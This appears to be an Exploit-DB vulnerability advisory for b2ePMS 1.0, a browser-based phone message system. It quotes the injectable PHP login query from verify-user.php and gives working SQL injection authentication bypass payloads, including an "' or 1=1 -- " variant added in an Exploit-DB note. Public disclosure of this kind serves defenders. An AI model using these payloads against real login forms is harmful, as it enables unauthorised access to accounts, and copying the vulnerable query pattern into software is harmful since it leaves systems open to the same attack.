@@ -1,0 +1,61 @@
+#################################################
+b2ePMS 1.0 Authentication Bypass Vulnerability
+#################################################
+
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+
+Vendor Information:
+
+"b2ePMS stands for Browser to Email Phone Message System. It is intended to replace the standard 
+paper/carbon phone message slips commonly used in offices, with the capability of sending the message
+ via a web browser form directly to the recipients inbox."
+
+Vendor URI: https://developer.berlios.de/projects/b2epms/
+
+#################################################
+# Exploit-DB Note
+# Loneferret
+# The provided PoC doesn't not work.
+# This does:
+# Username: "' or 1=1 -- "
+# Password: x
+
+Issue: SQL Injection, Authentication Bypass
+
+Risk level: High
+
+=> The remote attacker has the possibility to execute arbitrary SQL Code.
+
+=> The remote attacker is able to bypass the user authentication.
+
+In verify-user.php, line 20:
+
+-------------------------------------
+
+$sql = mysql_query("SELECT * FROM b2epms_user WHERE username='$username' AND user_passwd='$admin_passwd' AND activated='1' AND user_level='2'");
+$login_check = mysql_num_rows($sql);
+if($login_check > 0){
+  while($row = mysql_fetch_array($sql)){
+  foreach( $row AS $key => $val ){
+    $$key = stripslashes( $val );
+  }
+    // Register session variables!
+    session_register('userid');
+    $_SESSION['userid'] = $user_level;
+    mysql_query("UPDATE b2epms_user SET login_date=now() WHERE userid='$userid'"); $url = "Location: admin.php";
+    header($url);
+  }
+}
+
+-------------------------------------
+
+Exploit / Proof Of Concept:
+
+Perform a login with the following data:
+
+Username: admin' OR '1='1
+Password: x
+
+-------------------------------------
+
+#################################################
